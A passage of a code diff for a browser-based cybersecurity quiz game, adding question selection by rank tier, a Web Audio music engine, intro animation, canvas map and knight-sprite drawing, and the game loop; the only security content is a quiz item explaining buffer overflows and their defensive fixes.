+   options:['Using sprintf instead of printf','Buffer overflow — no bounds checking allows stack corruption and code execution','Missing null terminator','Stack is too small'],
+   correct:1,explanation:'Buffer overflows allow attackers to overwrite memory and execute arbitrary code. Fix: use safe functions (snprintf with size limit), bounds-check all copies, prefer memory-safe languages, and enable stack protection flags (ASLR, canaries).'}
+]
+};
+
+// Select 5 random questions from each tier
+function selectQuestions() {
+  var selected = {};
+  ['paige','squire','knight'].forEach(function(tier) {
+    var pool = ALL_CHALLENGES[tier].slice();
+    // Shuffle pool
+    for (var i = pool.length - 1; i > 0; i--) {
+      var j = Math.floor(Math.random() * (i + 1));
+      var tmp = pool[i]; pool[i] = pool[j]; pool[j] = tmp;
+    }
+    selected[tier] = pool.slice(0, 5);
+  });
+  return selected;
 }
-function startSiegeChallenge(){
-  if (!currentSiege) initSiege();
-  var siDone=parseInt(localStorage.getItem('sk4_siege_done') || '0', 10);
+
+// ═══════════════════════════════════════════════
+// GAME STATE
+// ═══════════════════════════════════════════════
+var state = JSON.parse(localStorage.getItem('sk4_state') || 'null') || {
+  xp:0, rank:'paige', completed:[], badges:[], session:null, misses:0
+};
+if (!state.misses) state.misses = 0;
+
+// Ensure session questions are consistent
+var SESSION = null;
+if (state.session) {
+  SESSION = state.session;
+} else {
+  SESSION = selectQuestions();
+  state.session = SESSION;
+  localStorage.setItem('sk4_state', JSON.stringify(state));
+}
+
+// Flat ordered challenge list
+var CHALLENGES = SESSION.paige.concat(SESSION.squire).concat(SESSION.knight);
+
+var RANK_ORDER = ['paige','squire','knight'];
+var XP_THRESH  = {paige:0, squire:200, knight:500};
+var RANK_ICONS = {paige:'🛡️', squire:'⚔️', knight:'👑'};
+var RANK_LABELS= {paige:'Paige', squire:'Squire', knight:'Knight'};
+var RANK_CSS   = {paige:'rp', squire:'rs', knight:'rk'};
+
+var MAP_W = 3600, MAP_H = 560, CAM_EASE = 0.07;
+
+// Waypoints: start + 15 stones + castle
+var WAYPOINTS = [
+  {x:80,  y:440},{x:260, y:400},{x:460, y:450},{x:650, y:410},{x:850, y:450},
+  {x:1060,y:410},{x:1280,y:440},{x:1480,y:400},{x:1680,y:450},{x:1880,y:410},
+  {x:2080,y:450},{x:2300,y:410},{x:2500,y:450},{x:2700,y:410},{x:2900,y:450},
+  {x:3100,y:410},{x:3380,y:430}
+];
+
+var current = null;
+var shuffledOpts = []; // shuffled options for current question
+var shuffledCorrect = 0; // correct index in shuffled array
+var answered = false;
+var apiKey = sessionStorage.getItem('sk4_key') || '';
+var demoMode = false;
+var wizBusy = false;
+var stoneIdx = 0;
+
+var gc, ctx, mapCanvas, mapBuilt = false;
+var vpW, vpH;
+var charX = WAYPOINTS[0].x, charY = WAYPOINTS[0].y;
+var charTargetX = charX, charTargetY = charY;
+var charFrame = 0, charFrameTimer = 0, charFacing = 1;
+var charMoving = false, charAction = 'idle';
+var camX = 0, camTargetX = 0;
+var gameState = 'INTRO';
+var tick = 0;
+var sidebarShown = true, wizShown = true;
+
+// ═══════════════════════════════════════════════
+// MUSIC ENGINE
+// ═══════════════════════════════════════════════
+var Music = {
+  ctx: null, master: null, playing: false, muted: false,
+  loopTimer: null, currentZone: null,
+
+  start: function(zone) {
+    zone = zone || 'paige';
+    try {
+      if (!this.ctx) {
+        this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+        this.master = this.ctx.createGain();
+        this.master.gain.value = 0.32;
+        this.master.connect(this.ctx.destination);
+      }
+      if (this.ctx.state === 'suspended') this.ctx.resume();
+    } catch(e) { return; }
+
+    if (this.currentZone === zone && this.playing) return; // same zone, already playing
+    this.stop();
+    this.playing = true;
+    this.currentZone = zone;
+    this.playZone(zone, this.ctx.currentTime + 0.05);
+  },
+
+  stop: function() {
+    if (this.loopTimer) { clearTimeout(this.loopTimer); this.loopTimer = null; }
+    this.playing = false;
+  },
+
+  toggle: function() {
+    if (!this.ctx) { this.start(this.currentZone || 'paige'); return; }
+    this.muted = !this.muted;
+    if (this.master) this.master.gain.value = this.muted ? 0 : 0.32;
+    document.getElementById('btnMute').textContent = this.muted ? '🔇' : '🔊';
+  },
+
+  changeZone: function(zone) {
+    if (this.currentZone === zone) return;
+    this.start(zone);
+  },
+
+  // ── Note helper ──
+  note: function(freq, start, dur, type, vol, detune) {
+    if (!this.playing || !this.ctx || !this.master) return;
+    if (start < this.ctx.currentTime) return;
+    var o = this.ctx.createOscillator();
+    var g = this.ctx.createGain();
+    o.connect(g); g.connect(this.master);
+    o.type = type || 'sine';
+    o.frequency.value = freq;
+    if (detune) o.detune.value = detune;
+    g.gain.setValueAtTime(0, start);
+    g.gain.linearRampToValueAtTime(vol || 0.22, start + 0.04);
+    g.gain.exponentialRampToValueAtTime(0.001, start + dur * 0.85);
+    o.start(start); o.stop(start + dur);
+  },
+
+  // ── Drum noise ──
+  drum: function(start, vol, pitch) {
+    if (!this.playing || !this.ctx || !this.master) return;
+    if (start < this.ctx.currentTime) return;
+    try {
+      var buf = this.ctx.createBuffer(1, Math.floor(this.ctx.sampleRate * 0.06), this.ctx.sampleRate);
+      var d = buf.getChannelData(0);
+      for (var j=0; j<d.length; j++) d[j] = (Math.random()*2-1) * Math.exp(-j/(pitch||400));
+      var src = this.ctx.createBufferSource();
+      src.buffer = buf;
+      var dg = this.ctx.createGain(); dg.gain.value = vol || 0.12;
+      src.connect(dg); dg.connect(this.master);
+      src.start(start);
+    } catch(e) {}
+  },
+
+  playZone: function(zone, t) {
+    if (!this.playing || this.currentZone !== zone) return;
+    var self = this;
+    var loopDur;
+
+    if (zone === 'paige') {
+      loopDur = this.playPaige(t);
+    } else if (zone === 'squire') {
+      loopDur = this.playSquire(t);
+    } else {
+      loopDur = this.playKnight(t);
+    }
+
+    this.loopTimer = setTimeout(function() {
+      self.playZone(zone, t + loopDur);
+    }, (loopDur - 0.6) * 1000);
+  },
+
+  // ══ PAIGE THEME: Bright meadow, C major pentatonic, cheerful ══════════════
+  playPaige: function(t) {
+    var b = 60/108;
+    // C major pentatonic: C4, E4, G4, A4, C5, E5
+    var sc = [261.6, 329.6, 392.0, 440.0, 523.3, 659.3];
+    var mel =  [4, 5, 4, 3, 2, 3, 4, 2,  3, 4, 5, 4, 3, 2, 1, 0];
+    var durs = [1, 1, 1, 2, 1, 1, 2, 1,  1, 1, 1, 1, 1, 1, 1, 2];
+    var total = durs.reduce(function(a,v){return a+v;}, 0);
+    var mt = t;
+    for (var i=0; i<mel.length; i++) {
+      this.note(sc[mel[i]], mt, durs[i]*b*0.8, 'sine', 0.18);
+      if (i%3===0) this.note(sc[Math.min(mel[i]+2,5)], mt, durs[i]*b*0.7, 'sine', 0.06);
+      mt += durs[i]*b;
+    }
+    // Bass
+    var bass = [65.4, 130.8, 98.0, 130.8];
+    for (var i=0; i<4; i++) this.note(bass[i], t+i*4*b, 3.5*b, 'sine', 0.14);
+    // Light drums on beats
+    for (var i=0; i<4; i++) this.drum(t+i*4*b, 0.10, 500);
+    return total*b;
+  },
+
+  // ══ SQUIRE THEME: Dark forest, D minor, eerie & tense ════════════════════
+  playSquire: function(t) {
+    var b = 60/76; // slower, more ominous
+    // D natural minor: D3, F3, G3, A3, C4, D4, F4, A4
+    var sc = [146.8, 174.6, 196.0, 220.0, 261.6, 293.7, 349.2, 440.0];
+    // Eerie descending/ascending melody with tritones
+    var mel =  [4, 3, 2, 1, 0, 1, 2, 3,  4, 5, 4, 3, 2, 1, 0, 2];
+    var durs = [2, 1, 1, 2, 2, 1, 1, 2,  2, 1, 1, 1, 2, 1, 2, 1];
+    var total = durs.reduce(function(a,v){return a+v;}, 0);
+    var mt = t;
+    for (var i=0; i<mel.length; i++) {
+      this.note(sc[mel[i]], mt, durs[i]*b*0.75, 'triangle', 0.14);
+      // Dark harmony: minor third below
+      if (i%4===0) this.note(sc[mel[i]]*0.84, mt, durs[i]*b*0.9, 'sine', 0.08);
+      mt += durs[i]*b;
+    }
+    // Deep bass drone on D
+    this.note(36.7, t, 8*b, 'sine', 0.18); // D1 low drone
+    this.note(73.4, t, 8*b, 'sine', 0.10); // D2
+    this.note(36.7, t+8*b, 8*b, 'sine', 0.18);
+    this.note(73.4, t+8*b, 8*b, 'sine', 0.10);
+    // Sparse creepy plucks
+    this.note(220.0, t+3*b, 0.3*b, 'sawtooth', 0.06);
+    this.note(196.0, t+7*b, 0.3*b, 'sawtooth', 0.06);
+    this.note(174.6, t+11*b, 0.3*b, 'sawtooth', 0.06);
+    // Slow heavy drums every 2 beats
+    for (var i=0; i<Math.floor(total/2); i++) {
+      this.drum(t+i*2*b, 0.16, 200); // deep thud
+      if (i%2===1) this.drum(t+i*2*b+0.5*b, 0.08, 800); // snare
+    }
+    return total*b;
+  },
+
+  // ══ KNIGHT THEME: Shadow castle, chromatic/diminished, epic & dark ════════
+  playKnight: function(t) {
+    var b = 60/128; // intense, driving tempo
+    // Diminished / chromatic: E2, G2, Bb2, Db3, E3, G3, Bb3, E4
+    var sc = [82.4, 98.0, 116.5, 138.6, 164.8, 196.0, 233.1, 329.6];
+    // Driving war march melody
+    var mel =  [0, 2, 4, 3, 2, 1, 0, 4,  6, 5, 4, 3, 4, 5, 6, 7,  4, 3, 2, 1, 2, 3, 4, 0];
+    var durs = [1, 1, 2, 1, 1, 1, 2, 2,  1, 1, 1, 1, 1, 1, 1, 2,  1, 1, 1, 1, 1, 1, 2, 2];
+    var total = durs.reduce(function(a,v){return a+v;}, 0);
+    var mt = t;
+    for (var i=0; i<mel.length; i++) {
+      this.note(sc[mel[i]], mt, durs[i]*b*0.7, 'square', 0.10);
+      // Octave below for power
+      this.note(sc[mel[i]]*0.5, mt, durs[i]*b*0.6, 'sawtooth', 0.08);
+      mt += durs[i]*b;
+    }
+    // Ominous bass: E1, pulsing
+    for (var i=0; i<Math.floor(total/2); i++) {
+      this.note(41.2, t+i*2*b, 1.8*b, 'sine', 0.22); // E1
+    }
+    // Low drone (pedal tone)
+    this.note(41.2, t, total*b*0.9, 'sine', 0.10, -1200); // detuned for thickness
+    // War drums: fast and driving
+    for (var i=0; i<total; i++) {
+      this.drum(t+i*b, 0.18, 150);      // deep kick every beat
+      if (i%2===1) this.drum(t+i*b+b*0.5, 0.10, 1000); // fast snare
+      if (i%4===0) this.drum(t+i*b, 0.22, 80);          // extra bass hit on 1
+    }
+    // High tension stab every 4 beats
+    for (var i=0; i<Math.floor(total/4); i++) {
+      this.note(329.6, t+i*4*b, 0.15*b, 'sawtooth', 0.12); // high stab
+    }
+    return total*b;
+  }
+};
+
+// ═══════════════════════════════════════════════
+// INTRO
+// ═══════════════════════════════════════════════
+var introSlide = 0, introTimer = null;
+var INTRO_SLIDES = 4;
+
+function runIntro() {
+  // Generate stars
+  var stars = document.getElementById('intro-stars');
+  for (var i = 0; i < 150; i++) {
+    var s = document.createElement('div');
+    s.className = 'istar';
+    s.style.cssText = 'left:' + Math.random()*100 + '%;top:' + Math.random()*100 + '%;' +
+      'width:' + (Math.random()*2+1) + 'px;height:' + (Math.random()*2+1) + 'px;' +
+      '--d:' + (Math.random()*3+2) + 's;--o:' + (Math.random()*0.8+0.2) + ';' +
+      'animation-delay:' + Math.random()*3 + 's;';
+    stars.appendChild(s);
+  }
+
+  // Intro canvas scene
+  var ic = document.getElementById('intro-canvas');
+  var ictx = ic.getContext('2d');
+  ic.width = window.innerWidth; ic.height = window.innerHeight;
+
+  function drawIntroScene() {
+    ictx.clearRect(0,0,ic.width,ic.height);
+    var t = Date.now() / 1000;
+
+    // Ground
+    ictx.fillStyle = '#0A1A0A';
+    ictx.fillRect(0, ic.height*0.7, ic.width, ic.height*0.3);
+
+    // Distant castle silhouette
+    ictx.fillStyle = 'rgba(20,15,35,0.8)';
+    var cx = ic.width * 0.75;
+    var cy = ic.height * 0.4;
+    ictx.fillRect(cx-80, cy, 160, ic.height*0.3);
+    for (var i = 0; i < 5; i++) {
+      ictx.fillRect(cx - 80 + i*40, cy - 40, 25, 40);
+    }
+    // Castle glow
+    ictx.fillStyle = 'rgba(80,40,160,0.15)';
+    ictx.beginPath();
+    ictx.arc(cx, cy+20, 120, 0, Math.PI*2);
+    ictx.fill();
+
+    // Fireflies
+    for (var i = 0; i < 8; i++) {
+      var fx = ic.width*0.3 + Math.sin(t*0.7 + i*0.8)*ic.width*0.15;
+      var fy = ic.height*0.5 + Math.cos(t*0.5 + i*1.2)*ic.height*0.15;
+      var fo = 0.3 + Math.sin(t*2 + i) * 0.3;
+      ictx.fillStyle = 'rgba(200,220,50,' + fo + ')';
+      ictx.beginPath();
+      ictx.arc(fx, fy, 2.5, 0, Math.PI*2);
+      ictx.fill();
+    }
+
+    // Torch flame at bottom
+    ictx.fillStyle = 'rgba(255,120,0,' + (0.6 + Math.sin(t*4)*0.3) + ')';
+    ictx.beginPath();
+    ictx.arc(ic.width*0.2, ic.height*0.7, 15 + Math.sin(t*5)*3, 0, Math.PI*2);
+    ictx.fill();
+    ictx.fillStyle = 'rgba(255,220,0,' + (0.8 + Math.sin(t*5)*0.2) + ')';
+    ictx.beginPath();
+    ictx.arc(ic.width*0.2, ic.height*0.7, 6, 0, Math.PI*2);
+    ictx.fill();
+
+    requestAnimationFrame(drawIntroScene);
+  }
+  drawIntroScene();
+
+}
+
+function nextSlide() {
+  if (introSlide < INTRO_SLIDES - 1) {
+    introSlide++;
+    showSlide(introSlide);
+  }
+}
+
+function showSlide(n) {
+  document.querySelectorAll('.intro-slide').forEach(function(s,i) {
+    s.classList.toggle('active', i === n);
+  });
+}
+
+function skipIntro() {
+  if (introTimer) clearTimeout(introTimer);
+  document.getElementById('intro').classList.add('done');
+  afterIntro();
+}
+
+function startIntro() {
+  document.getElementById('intro').classList.add('done');
+  afterIntro();
+}
+
+function afterIntro() {
+  if (!gameMode) {
+    showPathModal();
+  } else {
+    // Returning player - restore order UI if in order mode
+    if (gameMode === 'order' && orderData) {
+      document.getElementById('sbOrderTab').style.display = '';
+      document.getElementById('sbSiegeTab').style.display = '';
+    }
+    showKeyModal();
+  }
+}
+
+// ═══════════════════════════════════════════════
+// MAP BUILDING
+// ═══════════════════════════════════════════════
+function buildMap() {
+  if (mapBuilt) return;
+  mapBuilt = true;
+  mapCanvas = document.createElement('canvas');
+  mapCanvas.width = MAP_W; mapCanvas.height = MAP_H;
+  var mc = mapCanvas.getContext('2d');
+  var z1 = MAP_W/3, z2 = MAP_W*2/3;
+
+  // Sky zones
+  var g = mc.createLinearGradient(0,0,0,MAP_H*0.55);
+  g.addColorStop(0,'#1A6B9E'); g.addColorStop(1,'#5BACD4');
+  mc.fillStyle=g; mc.fillRect(0,0,z1,MAP_H*0.55);
+  g = mc.createLinearGradient(0,0,0,MAP_H*0.55);
+  g.addColorStop(0,'#0A2A1A'); g.addColorStop(1,'#1A4A2A');
+  mc.fillStyle=g; mc.fillRect(z1,0,z2-z1,MAP_H*0.55);
+  g = mc.createLinearGradient(0,0,0,MAP_H*0.55);
+  g.addColorStop(0,'#0A0A1E'); g.addColorStop(1,'#1A0A2E');
+  mc.fillStyle=g; mc.fillRect(z2,0,MAP_W-z2,MAP_H*0.55);
+
+  // Ground zones
+  g = mc.createLinearGradient(0,MAP_H*0.5,0,MAP_H);
+  g.addColorStop(0,'#3A8A2A'); g.addColorStop(1,'#1E5010');
+  mc.fillStyle=g; mc.fillRect(0,MAP_H*0.5,z1,MAP_H*0.5);
+  g = mc.createLinearGradient(0,MAP_H*0.5,0,MAP_H);
+  g.addColorStop(0,'#1A3A0A'); g.addColorStop(1,'#0A1E04');
+  mc.fillStyle=g; mc.fillRect(z1,MAP_H*0.5,z2-z1,MAP_H*0.5);
+  g = mc.createLinearGradient(0,MAP_H*0.5,0,MAP_H);
+  g.addColorStop(0,'#2A2A3A'); g.addColorStop(1,'#141420');
+  mc.fillStyle=g; mc.fillRect(z2,MAP_H*0.5,MAP_W-z2,MAP_H*0.5);
+
+  // Hills
+  mc.fillStyle='#4CAF50';
+  for(var i=0;i<6;i++){mc.beginPath();mc.ellipse(i*180+90,MAP_H*0.52,120,45,0,Math.PI,0);mc.fill();}
+  mc.fillStyle='#1A4A1A';
+  for(var i=0;i<6;i++){mc.beginPath();mc.ellipse(z1+i*180+90,MAP_H*0.52,110,55,0,Math.PI,0);mc.fill();}
+
+  // Castle background
+  mc.fillStyle='#1E1E2E';
+  mc.fillRect(z2+200,0,MAP_W-z2-200,MAP_H*0.54);
+  mc.fillStyle='#2A2A3A';
+  for(var i=0;i<20;i++) mc.fillRect(z2+200+i*80,0,40,MAP_H*0.10);
+  mc.fillStyle='rgba(255,120,0,.35)';
+  for(var i=0;i<8;i++){mc.beginPath();mc.arc(z2+250+i*140,MAP_H*0.18,12,0,Math.PI*2);mc.fill();}
+
+  // Clouds
+  mc.fillStyle='rgba(255,255,255,0.65)';
+  [[150,60,70],[420,40,90],[750,70,60],[1000,50,80]].forEach(function(c){drawCloud(mc,c[0],c[1],c[2]);});
+  mc.fillStyle='rgba(60,40,80,0.55)';
+  [[2700,55,100],[2950,40,80],[3200,65,110],[3450,45,70]].forEach(function(c){drawCloud(mc,c[0],c[1],c[2]);});
+
+  // Path
+  mc.strokeStyle='rgba(139,100,48,.85)'; mc.lineWidth=26; mc.lineCap='round'; mc.lineJoin='round';
+  mc.beginPath(); mc.moveTo(WAYPOINTS[0].x,WAYPOINTS[0].y);
+  for(var i=1;i<WAYPOINTS.length;i++){
+    var p=WAYPOINTS[i-1],q=WAYPOINTS[i];
+    mc.quadraticCurveTo(p.x,p.y,(p.x+q.x)/2,(p.y+q.y)/2);
+  }
+  mc.lineTo(WAYPOINTS[WAYPOINTS.length-1].x,WAYPOINTS[WAYPOINTS.length-1].y);
+  mc.stroke();
+  mc.strokeStyle='rgba(210,170,100,.2)'; mc.lineWidth=14; mc.stroke();
+
+  // Trees and decorations
+  [90,200,350,500,700,900,1100].forEach(function(x){drawOak(mc,x,MAP_H*0.48-20);});
+  [1350,1500,1650,1800,1950,2050].forEach(function(x){drawPine(mc,x,MAP_H*0.5-30);});
+  var fc=['#FFD700','#FF6B6B','#FF85A1','#FFA500'];
+  for(var i=0;i<55;i++){
+    mc.fillStyle=fc[i%4];mc.beginPath();
+    mc.arc(Math.sin(i*1.618)*z1*0.42+z1*0.45,MAP_H*0.56+Math.cos(i*2.1)*45,3+Math.cos(i)*1.5,0,Math.PI*2);mc.fill();
+  }
+  for(var i=0;i<8;i++){drawTorch(mc,z2+100+i*170,MAP_H*0.54);}
+  for(var i=0;i<6;i++){
+    mc.strokeStyle='rgba(255,80,0,.35)';mc.lineWidth=3;mc.beginPath();
+    var lx=z2+200+i*160;mc.moveTo(lx,MAP_H*0.57);mc.lineTo(lx+30,MAP_H*0.62);mc.lineTo(lx+60,MAP_H*0.58);mc.stroke();
+    mc.fillStyle='rgba(255,80,0,.18)';mc.beginPath();mc.ellipse(lx+30,MAP_H*0.62,32,8,.2,0,Math.PI*2);mc.fill();
+  }
+  mc.font='18px serif';
+  for(var i=0;i<5;i++) mc.fillText('💀',z2+300+i*180,MAP_H*0.55);
+
+  // Zone labels
+  mc.font='bold 12px Cinzel,serif';mc.fillStyle='rgba(232,200,100,.45)';mc.textAlign='center';
+  mc.fillText('⸺ THE GREEN FIELDS ⸺',z1/2,26);
+  mc.fillText('⸺ THE DARK FOREST ⸺',z1+(z2-z1)/2,26);
+  mc.fillText('⸺ THE SHADOW CASTLE ⸺',z2+(MAP_W-z2)/2,26);
+}
+
+function drawCloud(mc,x,y,r){
+  mc.beginPath();mc.arc(x,y,r,0,Math.PI*2);mc.arc(x+r*.7,y-r*.3,r*.7,0,Math.PI*2);
+  mc.arc(x-r*.7,y-r*.2,r*.6,0,Math.PI*2);mc.arc(x+r*1.3,y,r*.5,0,Math.PI*2);mc.fill();
+}
+function drawOak(mc,x,y){
+  mc.fillStyle='#5A3A1A';mc.fillRect(x-5,y,10,40);
+  mc.fillStyle='#2E8B2E';mc.beginPath();mc.arc(x,y-10,35,0,Math.PI*2);mc.fill();
+  mc.fillStyle='#3AAA3A';mc.beginPath();mc.arc(x-12,y-20,22,0,Math.PI*2);mc.fill();
+  mc.fillStyle='#4ABB4A';mc.beginPath();mc.arc(x+8,y-25,18,0,Math.PI*2);mc.fill();
+}
+function drawPine(mc,x,y){
+  mc.fillStyle='#3A2A14';mc.fillRect(x-4,y+10,8,30);
+  var cols=['#0A3A0A','#0F5A0F','#156515'];
+  for(var i=0;i<3;i++){mc.fillStyle=cols[i];mc.beginPath();mc.moveTo(x,y-30-i*20);mc.lineTo(x-28+i*8,y+i*20);mc.lineTo(x+28-i*8,y+i*20);mc.closePath();mc.fill();}
+}
+function drawTorch(mc,x,y){
+  mc.fillStyle='#5A3A1A';mc.fillRect(x-3,y-5,6,20);
+  mc.fillStyle='rgba(255,140,0,.35)';mc.beginPath();mc.arc(x,y-8,18,0,Math.PI*2);mc.fill();
+  mc.fillStyle='#FF8C00';mc.beginPath();mc.arc(x,y-10,6,0,Math.PI*2);mc.fill();
+  mc.fillStyle='#FFD700';mc.beginPath();mc.arc(x,y-12,3,0,Math.PI*2);mc.fill();
+}
+
+// ═══════════════════════════════════════════════
+// KNIGHT DRAWING
+// ═══════════════════════════════════════════════
+function drawKnight(ctx,cx,cy,frame,dir,action){
+  ctx.save(); ctx.translate(cx,cy);
+  if(dir<0) ctx.scale(-1,1);
+  var f=frame%4;
+  var bob=[0,-4,0,-4][f];
+  var ls=[7,0,-7,0][f];
+  var as=[-3,0,3,0][f];
+  if(action==='victory'){bob=-10+Math.sin(Date.now()/130)*5;as=Math.sin(Date.now()/110)*12;}
+  if(action==='stumble'){bob=Math.sin(Date.now()/80)*4;}
+
+  ctx.globalAlpha=0.22;ctx.fillStyle='#000';ctx.beginPath();ctx.ellipse(0,7-bob*.3,18,5,0,0,Math.PI*2);ctx.fill();ctx.globalAlpha=1;
+
+  // Legs
+  ctx.fillStyle='#1A3A70';
+  ctx.fillRect(-10,-10+bob+ls*.8,9,18-Math.abs(ls)*.3);
+  ctx.fillRect(1,-10+bob-ls*.8,9,18-Math.abs(ls)*.3);
+  // Boots
+  ctx.fillStyle='#0D2040';
+  ctx.fillRect(-11,7+bob+ls*.8,11,6);ctx.fillRect(0,7+bob-ls*.8,11,6);
+  // Body
+  ctx.fillStyle='#3A6FBF';ctx.fillRect(-12,-34+bob,24,26);
+  ctx.fillStyle='#4A85D9';ctx.fillRect(-10,-33+bob,20,12);
+  ctx.fillStyle='#2D5A99';ctx.fillRect(-12,-22+bob,24,4);
+  // Belt
+  ctx.fillStyle='#C48A10';ctx.fillRect(-12,-12+bob,24,4);
+  // Arms
+  ctx.fillStyle='#3A6FBF';
+  ctx.fillRect(-19,-32+bob+as,8,18);ctx.fillRect(11,-32+bob-as,8,18);
+  // Shield
+  ctx.fillStyle='#2D5A99';ctx.fillRect(-25,-36+bob+as,11,20);
+  ctx.strokeStyle='#E8A820';ctx.lineWidth=1.5;ctx.strokeRect(-25,-36+bob+as,11,20);
+  ctx.fillStyle='#E8A820';ctx.fillRect(-22,-30+bob+as,3,3);
+  // Sword
+  if(action==='victory'){
+    ctx.fillStyle='#C8C8C8';ctx.fillRect(16,-52+bob-as,4,26);
+    ctx.fillStyle='#8B4A00';ctx.fillRect(14,-60+bob-as,8,10);
+    ctx.fillStyle='#C48A10';ctx.fillRect(12,-52+bob-as,12,3);
+  } else {
+    ctx.fillStyle='#C8C8C8';ctx.fillRect(18,-34+bob-as,4,28);
+    ctx.fillStyle='#8B4A00';ctx.fillRect(16,-42+bob-as,7,10);
+    ctx.fillStyle='#C48A10';ctx.fillRect(14,-32+bob-as,12,3);
+  }
+  // Neck
+  ctx.fillStyle='#F0C890';ctx.fillRect(-5,-44+bob,10,12);
+  // Helmet
+  ctx.fillStyle='#2D5A99';ctx.fillRect(-12,-58+bob,24,16);
+  ctx.fillStyle='#1A3A70';ctx.fillRect(-9,-48+bob,18,6);
+  ctx.fillStyle='#C48A10';ctx.fillRect(-12,-58+bob,24,3);ctx.fillRect(-12,-43+bob,24,2);
+  // Plume
+  ctx.fillStyle='#E84040';ctx.fillRect(-3,-68+bob,6,12);ctx.fillRect(-6,-66+bob,12,5);
+  ctx.fillStyle='#FF6060';ctx.fillRect(-2,-70+bob,4,4);
+
+  ctx.restore();
+}
+
+// ═══════════════════════════════════════════════
+// CANVAS & RESIZE
+// ═══════════════════════════════════════════════
+function resizeCanvas(){
+  var lw = sidebarShown ? 230 : 0;
+  var rw = wizShown ? 280 : 0;
+  vpW = window.innerWidth - lw - rw;
+  vpH = window.innerHeight - 56;
+  gc.width = vpW; gc.height = vpH;
+}
+
+// ═══════════════════════════════════════════════
+// GAME LOOP
+// ═══════════════════════════════════════════════
+var lastTime = 0;
+function loop(ts){
+  var dt = Math.min((ts - lastTime)/1000, 0.05);
+  lastTime = ts;
+  tick++;
+  update(dt);
+  render();
+  requestAnimationFrame(loop);
+}
+
+function update(dt){
+  if(gameState==='MODAL'||gameState==='QUESTIONING'||gameState==='INTRO') return;
+  charFrameTimer += dt;
+  if(charMoving && charFrameTimer > 0.1){charFrame++;charFrameTimer=0;}
+  if(charMoving){
+    var dx=charTargetX-charX, dy=charTargetY-charY;
+    var dist=Math.sqrt(dx*dx+dy*dy);
+    charFacing = dx >= 0 ? 1 : -1;
+    if(dist < 3){
+      charX=charTargetX; charY=charTargetY;
+      charMoving=false; charFrame=0;
+      onReachedWaypoint();
+    } else {
+      var spd = Math.min(180*dt, dist);
+      charX += (dx/dist)*spd; charY += (dy/dist)*spd;
+    }
+  }
+  var des = Math.max(0, Math.min(MAP_W-vpW/((window.innerHeight-56)/MAP_H), charX - vpW*0.4*(MAP_H/(window.innerHeight-56))));
+  camX += (des - camX) * Math.min(CAM_EASE*60*dt, 1);
+}
+
+function render(){
+  if(!ctx) return;
+  ctx.clearRect(0,0,vpW,vpH);
+  var scale = vpH/MAP_H;
+  ctx.save();
+  ctx.scale(scale,scale);
+  ctx.translate(-camX/scale,0);
+  if(mapCanvas) ctx.drawImage(mapCanvas,0,0);
+  // Draw stones
+  for(var i=1;i<WAYPOINTS.length-1;i++) drawStone(ctx,WAYPOINTS[i],i);
+  drawStartFlag(ctx);
+  drawEndGate(ctx);
+  drawKnight(ctx,charX,charY,charFrame,charFacing,charMoving?'walk':charAction);
+  ctx.restore();
+}
+
+function drawStone(ctx,wp,idx){
+  var ch = CHALLENGES[idx-1];
+  if(!ch) return;
+  var isDone = state.completed.includes(ch.id);
+  var isCur = stoneIdx===idx;
+  var isLocked = !isDone && stoneIdx < idx;
+  var x=wp.x, y=wp.y, r=24;
+
+  if(isCur){ctx.shadowColor='#E8A820';ctx.shadowBlur=28+Math.sin(tick*.1)*8;}
+  ctx.beginPath();ctx.arc(x,y-r,r,0,Math.PI*2);
+  if(isDone){ctx.fillStyle='#1A4A2A';ctx.fill();ctx.strokeStyle='#2ECC8A';}
+  else if(isCur){ctx.fillStyle='#3A2A00';ctx.fill();ctx.strokeStyle='#E8A820';}
+  else if(isLocked){ctx.fillStyle='rgba(8,10,22,.7)';ctx.fill();ctx.strokeStyle='#1E2D50';}
+  else{ctx.fillStyle='#1A2040';ctx.fill();ctx.strokeStyle='#3A5080';}
+  ctx.lineWidth=3;ctx.stroke();ctx.shadowBlur=0;
+
+  ctx.font='bold 13px Cinzel,serif';ctx.textAlign='center';ctx.textBaseline='middle';
+  if(isDone){ctx.fillStyle='#2ECC8A';ctx.fillText('✓',x,y-r);}
+  else if(isLocked){ctx.fillStyle='#2A3A5A';ctx.fillText('🔒',x,y-r);}
+  else{ctx.fillStyle=isCur?'#FFD700':'#7A9ACA';ctx.fillText(String(idx),x,y-r);}
+
+  if(!isLocked){
+    ctx.font='9px JetBrains Mono,monospace';
+    ctx.fillStyle=isDone?'rgba(46,204,138,.7)':isCur?'rgba(232,168,32,.8)':'rgba(100,130,180,.55)';
+    ctx.fillText((ch.topic||'').substring(0,14),x,y+6);
+  }
+  ctx.fillStyle=isDone?'#2A5A3A':isCur?'#4A3A00':'#151E35';
+  ctx.beginPath();ctx.ellipse(x,y,28,10,0,0,Math.PI*2);ctx.fill();
+}
+
+function drawStartFlag(ctx){
+  var w=WAYPOINTS[0];
+  ctx.fillStyle='#5A3A1A';ctx.fillRect(w.x-2,w.y-60,4,50);
+  ctx.fillStyle='#E8A820';ctx.beginPath();ctx.moveTo(w.x+2,w.y-60);ctx.lineTo(w.x+2,w.y-40);ctx.lineTo(w.x+24,w.y-50);ctx.closePath();ctx.fill();
+  ctx.font='9px Cinzel,serif';ctx.fillStyle='#000';ctx.textAlign='center';ctx.fillText('START',w.x+12,w.y-49);
+}
+
+function drawEndGate(ctx){
+  var w=WAYPOINTS[WAYPOINTS.length-1];
+  ctx.fillStyle='#2A2040';ctx.fillRect(w.x-30,w.y-80,60,70);
+  ctx.fillStyle='#1A1030';ctx.beginPath();ctx.arc(w.x,w.y-80,30,Math.PI,0);ctx.fill();
+  ctx.strokeStyle='#C48A10';ctx.lineWidth=3;ctx.strokeRect(w.x-30,w.y-80,60,70);
+  ctx.strokeStyle='#8B6914';ctx.lineWidth=2;
+  for(var i=0;i<5;i++){ctx.beginPath();ctx.moveTo(w.x-20+i*10,w.y-60);ctx.lineTo(w.x-20+i*10,w.y-20);ctx.stroke();}
+  ctx.font='bold 10px Cinzel,serif';ctx.fillStyle='#E8A820';ctx.textAlign='center';ctx.fillText('CASTLE',w.x,w.y-88);
+}
+
+// ═══════════════════════════════════════════════
+// GAME STATE MACHINE
+// ═══════════════════════════════════════════════
+function walkToNextStone(){
+  if(stoneIdx >= WAYPOINTS.length-1) return;
+  stoneIdx++;
+  charTargetX=WAYPOINTS[stoneIdx].x;
+  charTargetY=WAYPOINTS[stoneIdx].y;
+  charMoving=true; charAction='walk';
+  gameState='WALKING';
